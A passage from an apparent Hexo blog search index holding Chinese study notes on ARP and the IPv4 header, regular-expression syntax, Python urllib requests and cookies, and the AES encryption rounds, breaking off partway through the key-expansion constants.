在局域网中，由于硬件层地址已经固化在网卡上的ROM中，因此常常将硬件地址称为物理地址。因为在局域网的MAC帧中的源地址与目的地址都是硬件地址，故又称MAC地址。 ![QQ图片20200427151103](D:\My Daily\P\QQ图片20200427151103.png) 在发送数据时，数据从高层下到低层，最后才到通信链路上传输，使用IP地址的IP数据报一交给数据链路层就被封装成MAC帧。连接在通信链路上的的设备如主机/路由器，在收到MAC帧时，根据MAC帧首部中的硬件地址决定收下或丢弃。只有在剥去MAC帧的首部尾部后，把MAC层数据交给网络层后，网络层才能在IP数据报的的首部中找到源IP地址与目的地址。 总之，IP地址放在IP数据报的首部，而硬件地址放在MAC帧首部。网络层和网络层以上使用IP地址，数据链路层及以下使用硬件地址。IP层上可以看作由IP组成的虚拟互联网，具体实现用到了MAC地址。 重要的几点：在IP层抽象的互联网上只能看见IP数据报，即使IP数据报要经过路由器的两次转发，但是在它首部中的源地址和目的地址始终分别为IP1与IP2，中间经过的路由器IP地址并不包含。/虽然IP数据报的首部有源站IP地址，但是路由器只根据目的站IP地址进行路由选择（废话，不然根据什么？）/在数据链路层只能看见MAC帧，IP数据报被封装在MAC帧中，MAC帧在不同网络上传送时，其MAC首地址和源地址要发生变化。例如从H1传到R1时，其MAC帧首部中写的是从硬件地址HA1发送到R1的硬件地址H3，R1路由器收到MAC帧后，在数据链路层丢弃原来MAC帧的首部尾部，并添上新的首部尾部进行转发。/尽管互联在一起的网络的硬件地址体系各不同，但是IP层抽象的互联网屏蔽了下层的复杂细节。只要在网络层讨论问题，就能使统一抽象的IP地址研究主机和主机/路由间的通信。 地址解析协议ARP：主机和路由器怎么知道应当在MAC帧的首部填上什么样的硬件地址？已经知道了一个主机/路由器的IP地址，如何找出其相应的硬件地址？ARP就是用来解决此问题的。 ![QQ图片20200429142619](D:\My Daily\P\QQ图片20200429142619.png) ARP协议的用途是从网络层使用的IP地址解析出数据链路层使用的物理地址。由于在实际的网络上传输数据帧时，必须使用该网络的硬件地址。但IP地址和硬件地址间由于格式不同并不是简单的映射关系。此外，在一个网络上可能会有主机的加入与退出，同时更换网络适配器也会使主机的硬件地址改变。ARP协议可以在主机ARP高速缓存中存放一个从IP地址到硬件地址的映射表，并且这个映射表经常动态更新。 每一台主机都有一个ARP高速缓存（ARP cache），里面有本局域网上的各主机和路由器的IP地址到硬件地址的映射表，这些都是该主机目前知道的一些地址。 ARP获取新地址的过程：当主机A要向本局域网上某台主机B发送IP数据报时，先在其ARP高速缓存中查看有无主机B的IP地址。若有，就在ARP高速缓存中查出其对应的硬件地址，再把这个硬件地址写入MAC帧。 若无，可能是主机B刚入网，也可能是主机A刚加电，其高速缓存还是空的。按照如下步骤添加MAC地址： ARP进程在本局域网上发送一个ARP请求分组，其中有主机A的IP地址，硬件地址，请求IP地址为X.X.X.X主机的硬件地址。 在本局域网上的所有主机上运行的ARP进程都收到此ARP请求分组。 主机B的IP地址与ARP请求分组中要查询的IP地址一致，即收下该请求分组，并向主机A发送ARP响应分组，同时在该响应分组中写入其硬件地址。注意ARP请求分组是广播，而ARP响应分组是单播，即从一个源地址发送到一个目的地址。 当主机A收到B的ARP响应分组后，就在其ARP高速缓存中写入主机B的IP地址到硬件地址的映射。 ARP高速缓存将已得到的地址映射保存在高速缓存中，这就使得该主机下次再和具有同样目的地址的主机通信时，可以直接从高速缓存中找到所需的硬件地址而不必再使用广播的方式发送。 ARP对保存在高速缓存中的每一个映射地址项目都设置生存时间，通常为10-20min。及时更新其中的项目，将已经失效的映射地址项目处理掉，通信时重新广播ARP请求，避免出现错误。 注意ARP是解决同一个局域网上的主机或路由器的IP地址映射问题，当在不同局域网上通信时，使用路由器作为媒介：主机A传到R1，R1通过转发表找到下一跳路由器R2，同时使用ARP找出R2硬件地址，R2接收后使用类似方法解析出目的主机B的硬件地址，最终交付。 既然在网络链路上传输的帧最终是按照硬件地址找到目的主机的，那么为什么还要使用IP地址？全世界存在着各种各样的网络，使用着不同的硬件地址。要使这些异构网络能够相互通信就必须进行非常复杂的硬件地址转换工作，而由用户/用户主机完成这项工作是不可能的。IP地址编码将通信变得像是连接在一个网络上一样方便。 IP数据报的格式在TCP/IP的标准中，各种数据格式常常以32位即4字节来描述。 ![QQ图片20200429151754](D:\My Daily\P\QQ图片20200429151754.png) 一个IP数据报由首部与数据两部分构成，首部的前一部分是固定长度共20字节，所有IP数据报必须具有。 版本：占4位，IP协议版本，IPV4/IPV6，通信双方使用的版本要一致。 首部长度：占4位，可表示的最大十进制数为15，单位为32位即4字节。所以首部长度最大为60字节。最小值为5，固定长度。长度不是4字节整数倍时自动填充，确保数据部分在4字节整数倍开始，实现IP协议时比较方便。 区分服务：占8位，用来获得更好的服务？？？？一般情况下没有用？？？？ 总长度：占16位，首部和数据之和的长度，单位为字节，总长度字段为16位。IP层下面的每一种数据链路层协议都规定了一个数据帧中数据字段的最大长度，称为最大传送单元MTU。当一个IP数据报封装成链路层的帧时，需要向下兼容，不能超过下面数据链路层所规定的MTU值，否则会被进行分片处理。进行分片时，总长度字段是指分片后的每一个分片首部长度与该分片数据长度总和。 数据报越长使用效率越高，但是为了路由转发速度，规定互联网中所有主机和路由器，能够接受长度不超过576字节的数据报。512字节数据+60字节首部+4字节富余量。 标识：占16位。IP软件在存储器中维持一个计数器，每产生一个数据报就加一，并将此值赋给标识字段（由于IP是无连接服务，故该字段并不能看成序号）。当数据报由于超过MTU而进行分片，该字段作为重装的依据。 标志：占3位，只有前两位有意义。该字段最低位记为MF(More Fragment)。MF=1表示后面还有分片的数据报，MF=0表示已是最后一个数据报。中间一位记为DF(Don’t Fragment）意为不能分片。DF=0时允许分片。 片偏移：占13位。分片后某片在原分组中的相对位置，以8个字节为单位，所以每个分片的长度一定是8字节的整数倍。（也不懂为啥要用每一片首地址除以8，可能是缩小长度吧） 生存时间：占8位，TTL(Time To Live)，表明数据报在网络中的寿命。由发出数据报的源点设置这个字段，防止无法交付的数据报无限制地在互联网中游荡。TTL的功能从倒计时变为了跳数限制，路由器每次转发前将TTL减一。初始值设为一，就表示这个数据报只能在本局域网中传送。TTL的意义是指明数据报在互联网中可以经过多少个路由器，显然数据报能在互联网经过的路由器最大数值是255？ 协议：占8位，协议字段之处此数据携带的数据是何种协议，以使目的主机的IP层知道应将数据部分上交给哪个协议进行处理。 ![QQ图片20200429160622](D:\My Daily\P\QQ图片20200429160622.png) 首部校验和：占16位，只检查数据报的首部，不包括数据部分。这是因为数据报每经过一个路由器，路由器都要重新计算一下首部校验和（如生存时间/标志/片偏移可能会发生变化）。为了进一步减少计算工作量，IP的首部校验和不采用CRC检验码而如下计算： ![QQ图片20200429162919](D:\My Daily\P\QQ图片20200429162919.png) 源地址：占32位。 目的地址：占32位。 IP数据报的可变部分，选项字段，用于支持排错。测量以及安全的措施。 IP层转发分组的流程]]></content>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2F2020%2F04%2F01%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[正则表达式(Regular Expression)是一种文本模式，包括普通字符和特殊字符(称为元字符)。正则表达式使用单个字符串来描述，匹配一系列符合某个句法规则的字符串。许多程序设计原因呢都支持利用正则表达式进行字符串操作。 知识点太细碎还是要多用才能记住。 简介正则表达式的工作原理与*和.通配符类似，但前者功能更强大更灵活。 典型的搜索与替换操作，要求提供与预期的的搜索结果匹配的确切文本。这种技术在应对动态文本的搜索时很困难。通过正则表达式可以 测试字符串内的模式，如测试输入字符串查看字符串内是否出现电话号码/身份证号，称为数据验证。 替换文本，使用正则表达式识别文档中的特定文本，完全删除该文本或者用其他文本替换。 基于模式匹配从字符串中提取子字符串，查找文档内/输入域内特定的个文本。 语法正则表达式描述了一种字符串匹配的模式，用来检擦一个串是否含有某种子串，将匹配的子串替换或者从某个串中取出某个符合条件的子串。 构建正则表达式的方法域创建数学表达式一样，用多种元字符域运算符可以将小的表达式结合在一起创建更大的表达式。正则表达式是由普通字符以及特殊字符组成的文字模式，模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式域所搜索的字符串进行匹配。 普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。 非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列： \cx 匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \f 匹配一个换页符。等价于 \x0c 和 \cL。 \n 匹配一个换行符。等价于 \x0a 和 \cJ。 \r 匹配一个回车符。等价于 \x0d 和 \cM。 \s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。 \S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 \t 匹配一个制表符。等价于 \x09 和 \cI。 \v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 特殊字符：许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\ 放在它们前面。 $ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。 * 匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。 . 匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用 [。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。 \ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。 { 标记限定符表达式的开始。要匹配 {，请使用 {。 | 指明两项之间的一个选择。要匹配 |，请使用 |。 限定符：用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 *** 或 **+ 或 ? 或 {n} 或 {n,}或 {n,m} 共6种。 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 *\、+** 限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个?就可以实现非贪婪或最小匹配。** 定位符：能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。 定位符用来描述字符串或单词的边界，^ 和 $ 分别指字符串的开始与结束，\b 描述单词的前或后边界，\B 表示非单词边界。 ^ 匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。 $ 匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。 \b 匹配一个单词边界，即字与空格间的位置。 \B 非单词边界匹配。 不能将限定符与定位符一起使用。由于在紧靠换行或者单词边界的前面或后面不能有一个以上位置，因此不允许诸如 ^* 之类的表达式。 若要匹配一行文本开始处的文本，请在正则表达式的开始使用 ^ 字符。不要将 ^ 的这种用法与中括号表达式内的用法混淆。 若要匹配一行文本的结束处的文本，请在正则表达式的结束处使用 $ 字符。 选择： 用圆括号将所有选择项括起来，相邻的选择项之间用|分隔。但用圆括号会有一个副作用，使相关的匹配会被缓存，此时可用?:放在第一个选项前来消除这种副作用。 其中 ?: 是非捕获元之一，还有两个非捕获元是 ?= 和 ?!，这两个还有更多的含义，前者为正向预查，在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串，后者为负向预查，在任何开始不匹配该正则表达式模式的位置来匹配搜索字符串。 元字符 \ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “&quot; 而 “(“ 则匹配 “(“。 ^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。 $ 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 ? 当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。 . 匹配除换行符（\n、\r）之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像”(.|\n)“的模式。 (pattern) 匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(‘ 或 ‘)‘。 (?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。 (?=pattern) 正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，”Windows(?=95|98|NT|2000)”能匹配”Windows2000”中的”Windows”，但不能匹配”Windows3.1”中的”Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?!pattern) 正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如”Windows(?!95|98|NT|2000)”能匹配”Windows3.1”中的”Windows”，但不能匹配”Windows2000”中的”Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?&lt;=pattern) 反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，”`(?&lt;=95 (?&lt;!pattern) 反向否定预查，与正向否定预查类似，只是方向相反。例如”(?&quot;能匹配&quot;3.1Windows&quot;中的&quot;Windows&quot;，但不能匹配&quot;2000Windows&quot;中的&quot;Windows`”。 x|y 匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。 [xyz] 字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。 [^xyz] 负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。 [a-z] 字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。 [^a-z] 负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。 \b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \B 匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \cx 匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \d 匹配一个数字字符。等价于 [0-9]。 \D 匹配一个非数字字符。等价于 [^0-9]。 \f 匹配一个换页符。等价于 \x0c 和 \cL。 \n 匹配一个换行符。等价于 \x0a 和 \cJ。 \r 匹配一个回车符。等价于 \x0d 和 \cM。 \s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。 \S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 \t 匹配一个制表符。等价于 \x09 和 \cI。 \v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 \w 匹配字母、数字、下划线。等价于’[A-Za-z0-9_]’。 \W 匹配非字母、数字、下划线。等价于 ‘[^A-Za-z0-9_]’。 \xn 匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。 \num 匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。 \n 标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。 \nm 标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。 \nml 如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。 \un 匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。 运算符优先级正则表达式从左到右进行计算，并遵循优先级顺序，这与算术表达式非常类似。 相同优先级的从左到右进行运算，不同优先级的运算先高后低。 \ 转义符 (), (?:), (?=), [] 圆括号和方括号 *, +, ?, {n}, {n,}, {n,m} 限定符 ^, $, \任何元字符、任何字符 定位点和序列（即：位置和顺序） | 替换，”或”操作 字符具有高于替换运算符的优先级，使得”m|food”匹配”m”或”food”。若要匹配”mood”或”food”，请使用括号创建子表达式，从而产生”(m|f)ood”。 匹配规则基本模式匹配： 模式，是正则表达式最基本的元素，它们是一组描述字符串特征的字符。模式可以很简单，由普通的字符串组成，也可以非常复杂，往往用特殊的字符表示一个范围内的字符、重复出现，或表示上下文。 字符簇： 正则表达式通常用来验证用户的输入。当用户提交一个FORM以后，要判断输入的电话号码、地址、EMAIL地址、信用卡号码等是否有效，用普通的基于字面的字符是不够的。所以要用一种更自由的描述我们要的模式的办法，它就是字符簇。用连字号可以表示一个字符的范围： 1[a-zA-Z] //匹配所有的字母 确定重复出现： 你已经知道如何去匹配一个字母或数字，但更多的情况下，可能要匹配一个单词或一组数字。一个单词有若干个字母组成，一组数字有若干个单数组成。跟在字符或字符簇后面的花括号({})用来确定前面的内容的重复出现的次数。 ^[a-zA-Z_]$ 所有的字母和下划线 ^[[:alpha:]]{3}$ 所有的3个字母的单词 ^a$ 字母a ^a{4}$ aaaa ^a{2,4}$ aa,aaa或aaaa ^a{1,3}$ a,aa或aaa ^a{2,}$ 包含多于两个a的字符串 ^a{2,} 如：aardvark和aaab，但apple不行 a{2,} 如：baad和aaa，但Nantucket不行 \t{2} 两个制表符 .{2} 所有的两个字符 一个数字 {x} 的意思是前面的字符或字符簇只出现x次 ；一个数字加逗号 {x,} 的意思是前面的内容出现x或更多的次数 ；两个数字用逗号分隔的数字 {x,y} 表示 前面的内容至少出现x次，但不超过y次。]]></content>
      <tags>
        <tag>计算机基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基本库与解析库的使用]]></title>
    <url>%2F2020%2F04%2F01%2F%E5%9F%BA%E6%9C%AC%E5%BA%93%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[urlliburllib是Python内置的HTTP请求库，包含request，error，parse，robotparser request是最基本的HTTP请求系统，可以用来模拟发送请求。就像在浏览器中输入网址并访问，只需要库方法传入URL以及额外的参数，就可以模拟实现此过程。 error异常处理模块，如果出现请求错误可以通过这个库捕获并重试等，保证程序不会意外终止。 parse工具模块，提供了URL处理方法，拆分，解析合并等。 robotparser用于识别robots.txt。 发送请求：urlopen() urllib.request提供了最基本的构造HTTP的请求方法，利用它可以模拟浏览器的一个请求发起过程，同时其带有处理授权验证，重定向，浏览器Cookies及其他内容。 12response = urllib.request.urlopen(&quot;https://www.baidu.com&quot;)//此处必须要加上https，得到这个对象之后将其赋值为response变量，调用方法和属性之后就能得到一系列信息。例如read()可以得到返回的网页内容，staus可以得到返回结果的状态码。 利用type()方法可以判断输出相应的类型为一个HTTPresponse类型的对象，包含read(),readinto(),getheader(name)等方法，msg,version,staus等属性。 如果要给链接传递参数：查阅API 1urllib.request.urlopen(url,data-None,[timeout,]*,cafile-None,capath-None,cadefault=False,context=None) 除了传递url之外，还可以传递data(附加顺序)timeout(超时时间)。 data参数：如果要添加该参数，如果它是字节流编码格式的内容，即bytes类型，则需要通过bytes()方法转化。传递了这个参数，则它的请求就不是Get而是Post。 123data = bytes(urllib.parse.urlencode(&#123;&apos;word&apos;:&apos;hello&apos;&#125;),encoding = &apos;utf-8&apos;)response = urllib.request.urlopen(&apos;http://httpbin.org/post&apos;,data = data)print(response.read()) 此处我们传递了一个参数word，值为hello。用bytes方法将其转码成了bytes类型。该方法第一个参数需为str类型，这里用到了urllib.parse模块里的urlencode()方法将其参数转化成字符串。第二个参数指定编码格式。 timeout参数：用于设置超时时间，单位为秒。超时则抛出异常，不设置时使用全局默认时间，支持HTTP/HTTPS/FTP。可以通过设置这个超时时间来跳过对长时间未响应网页的抓取。 其他参数：context参数，必须是ssl.AALContext用来指定SSL设置。cafile和capath分别指定CA证书和它的路径，这两个参数会在请求HTTPS时有用。 Request： urlopen()方法能够实现最基本的请求发起，但是上述几个简单的参数并不能构建一个完整的请求，如果请求中加入了Headers等信息，就可以利用更强大的requests类来构建。 12345import urllib.requestrequest = urllib.request.Request(&apos;http://www.baidu.com&apos;)reponse = urllib.request.urlopen(request)print(response.read().decode(&apos;utf-8&apos;)) 依然使用urlopen来发送这个请求，不过参数不再是URL，而是一个Request类型的对象。构造这个数据结构一方面可以将请求独立成一个对象，另一方面可以更灵活地配置参数。 1class urllib.request.Request(url,data=None,headers=&#123;&#125;,orgin_req_host=None,univerifable=false,method=None) 第一个参数url用于请求URL，为必传参数。 第二个参数data如果要传，必须传bytes类型，可以用urllib.parse.urlencode()编码。 第三个参数headers是一个字典，它就是请求头。构造请求时可以通过headers参数直接构造，也可以通过请求实例地add_header()方法添加。 添加请求头最常用的用法就是通过修改User-Agent来伪装浏览器，默认的User-Agent是python-urllib，修改它可以伪装浏览器。 第四个参数orgin_req_host指的是请求方地host名称或IP。 第五个参数unverifiable表示这个请求是否是无法验证的，默认是False，意思就是说用户没有足够权限来选择接收这个请求的结果。例如，我们请求一个HTML文档中的图片，但是我们没有自动抓取图像的权限，这时unverifiable的值就是True 第六个参数method是一个字符串，用来指示请求使用的方法，比如GET、POST和PUT等。 高级用法: 仅仅构造请求还不够，对于一些更高级的操作，如Cookies处理，代理设置等，就需要Handler。可以把它理解为各种处理器，处理登录验证的，处理Cookies的，处理代理设置的。利用它可以做的HTTP请求中的所有事。 urllib.request模块中的BaseHandler类是所有其他Handler类的父类，提供了最基本的方法如default_open(),protocol_request()，接下来就有各种子类继承BaseHandler类： HTTPDefaultErrorHandler：用于处理响应错误，错误会抛出HTTPError的异常。 HTTPRedirectHandler：用于处理重定向。 HTTPCookieProcessor：用于处理Cookies。 ProxyHandler：用于代理设置，默认代理为空。 HTTPPasswordMgr：用于管理密码，维护了用户名和密码的表。 HTTPBasicAuthHandler：用于管理认证。 另外一个比较重要的类就是OpenerDirector，可以称之为Opener。之前使用过的urlopen实际上就是urllib为我们提供的一个opener。引入opener能够实现更高级的功能，之前使用的request和urlopen()相当于类库为你封装好了常用的请求方法能够完成基本的请求。实现更高级的功能需要了解底层的配置。Opener与Handler的关系：利用Handler来构建Opener。 验证 代理 cookies处理 12345678import http.cookiejar,urllib.requestcookie = http.cookiejar.CookieJar()handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&quot;http://www.baidu.com&quot;)for item in cookie: print(item.name+&quot;=&quot;+item.value) 三者都是使用相关的函数 cookies输出为文件格式： 123456filename = &apos;cookies.txt&apos;cookie = http.cookiejar.MozillaCookieJar(filename)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build.opener(handler)\response = opener.open(&apos;http://www.baidu.com&apos;)cookie.save(ignore_discard=True,ignore_expires=True) 这时CookieJar就需要换成MozillaCookieJar，它在生成文件时会用到，是CookieJar的子类，可以用来处理Cookies和文件相关的事件，比如读取和保存Cookies，可以将Cookies保存成Mozilla型浏览器的Cookies格式]]></content>
  </entry>
  <entry>
    <title><![CDATA[AES加密]]></title>
    <url>%2F2020%2F03%2F29%2FAES%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[AES加密详解AES加密涉及到四种操作，分别是字节代替，行移位，列混淆和轮密钥加。看起来很高大上，其实把这几个名词理解了，加密过程也就通透了。 解密过程分别为对应的逆操作，由于每一步操作都是可逆的，按照相反的顺序进行解密即可恢复明文。 加解密过程中每轮密钥都由初始密钥扩展得到，在每一次轮密钥加的操作中用到。 根据分组长度128bit，密钥长度128bit/192bit/256bit分别加密不同的轮数（10，12，14）。 算法中16个字节(128bit)的明文密文密钥都以一个4*4的矩阵表示。 输入明文 轮密钥加 {字节代替，行移位，列混淆，轮密钥加}循环进行n-1轮 字节代替，行移位，轮密钥加 输出密文 字节替代字节替代的主要功能是通过S盒完成一个字节到另一个字节的映射，说白了就是查表。S盒用于提供密码算法的混淆性。输入的高4bit对应的值为行标，低4bit对应的值为列标。 行移位行移位是一个4*4的矩阵内部字节之间的置换，用于提供算法的扩展性。加密时，第一行保持不变，第二行循环左移8bit(矩阵中的一格)，第三行循环左移16bit(矩阵中的两格)，第四行循环左移24bit(矩阵中的三格)。 1state[i][j] = state[i][(j+1)%4],i,j∈[0,3] 列混淆利用GF(2⁸)域上算数特性的一个代替，同样用于提供算法的扩散性。 由矩阵乘法，在列混淆的过程中，每个字节对应的值只与该列的四个值有关。此处乘法和加法都是定义在GF(2⁸)上的。 将某个字节所对应的值乘以2，其结果就是将该值的二进制位左移一位，如果原始值的最高位为1，则还需要将移位后的结果异或00011011； 乘法对加法满足分配率，例如：07·S0,0=(01⊕02⊕04)·S0,0= S0,0⊕(02·S0,0)(04·S0,0)。 此处的矩阵乘法与一般意义上矩阵的乘法有所不同，各个值在相加时使用的是模2⁸加法（异或运算）。形式是矩阵乘法的形式，运算不是一般意义乘法的运算。 轮密钥加操作相对简单，依据的原理是“任何数和自身的异或结果为0”，加密过程中吗，每轮的输入与轮子密钥异或一次。解密时再异或一次即可恢复。 密钥扩展 密钥扩展过程说明： 1) 将种子密钥按图(a)的格式排列，其中k0、k1、……、k15依次表示种子密钥的一个字节；排列后用4个32比特的字表示，分别记为w[0]、w[1]、w[2]、w[3]； 2) 按照如下方式，依次求解w[j]，其中j是整数并且属于[4,43]； 3) 若j%4=0,则w[j]=w[j-4]⊕g(w[j-1]),否则w[j]=w[j-4]⊕w[j-1]； 函数g的流程说明： a) 将w循环左移8比特； b) 分别对每个字节做S盒置换； c) 与32比特的常量（RC[j/4],0,0,0）进行异或，RC是一个一维数组，其值如下。（RC的值只需要有10个，而此处用了11个，实际上RC[0]在运算中没有用到，增加RC[0]是为了便于程序中用数组表示。由于j的最小取值是4，j/4的最小取值则是1，因此不会产生错误。） RC = {0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 